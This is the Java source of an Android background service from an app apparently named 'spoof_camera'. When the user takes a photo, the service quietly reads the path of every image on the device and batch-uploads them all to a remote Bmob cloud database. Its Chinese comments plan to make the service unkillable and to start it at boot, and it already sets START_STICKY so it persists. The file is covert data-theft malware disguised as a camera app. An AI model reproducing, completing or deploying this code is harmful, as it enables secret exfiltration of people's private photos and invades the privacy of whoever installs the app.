package com.example.administrator.spoof_camera;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.File;
import java.util.List;

import cn.bmob.v3.datatype.BmobFile;
import cn.bmob.v3.listener.UploadBatchListener;

/*
*   这个getFiles是一个要在后台运行的进程，目的是在用户点击了拍摄照片的一瞬间就开始将在后台启动这个服务
*   当所有的图片全部被远程传输到数据库的时候，那么服务就可以被关闭
*   还没有实现的一点是：强制后台进程不能被关闭和开机自启。
*   对了，每次加入数据库中，需要对所加的文件进行判断，如果这个文件在数据库中已经存在的话，那么就不再加这个文件了。
*/
public class getFiles extends Service {
    final private String[] paths = new String[10000];
    private int count = 0;
    //必须要实现的方法
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        Log.i("TAG","onBind方法被调用！");
        return null;
    }

    //Serviece被创建时调用
    @Override
    public void onCreate() {
        Log.i("TAG","onCreate方法被调用！");
        super.onCreate();
    }

    //Service被启动时调用
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        flags = START_STICKY;//保证My_service不被杀死
        Log.i("TAG","onStartCommand方法被调用");
        //在这个地方调用我们要开展的服务
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
////                getFileList();
//            }
//        }).start();
        getFileList();
        return super.onStartCommand(intent, flags, startId);
    }

    //Service被关闭之前调用

    @Override
    public void onDestroy() {
        Log.i("TAG","onDestory方法被调用");
        super.onDestroy();
    }

    public void getFileList() {
        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
        while (cursor.moveToNext()) {
            //按我个人理解 这个是获得用户选择的图片的索引值
            int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            //获取图片的名称
            String sub_path = cursor.getString(column_index);
            paths[count++] = sub_path;
        }
        //这个地方开始批量上传
        BmobFile.uploadBatch(paths, new UploadBatchListener() {
            @Override
            public void onSuccess(List<BmobFile> files, List<String> urls) {
                //1、files-上传完成后的BmobFile集合，是为了方便大家对其上传后的数据进行操作，例如你可以将该文件保存到表中
                //2、urls-上传文件的完整url地址
                if (urls.size() == paths.length) {//如果数量相等，则代表文件全部上传完成
                    Log.i("TAG","现在已经全部上传完成了！");
                    //onDestroy();//结束服务
                }
            }

            @Override
            public void onError(int statuscode, String errormsg){
                Log.i("TAG","错误码："+statuscode+" "+"错误描述："+errormsg);
            }

            @Override
            public void onProgress(int curIndex, int curPercent, int total, int totalPercent){
                //1、curIndex--表示当前第几个文件正在上传
                //2、curPercent--表示当前上传文件的进度值（百分比）
                //3、total--表示总的上传文件数
                //4、totalPercent--表示总的上传进度（百分比）
                Log.i("TAG","现在正在上传第"+curIndex+"个");
            }
        });
    }
}
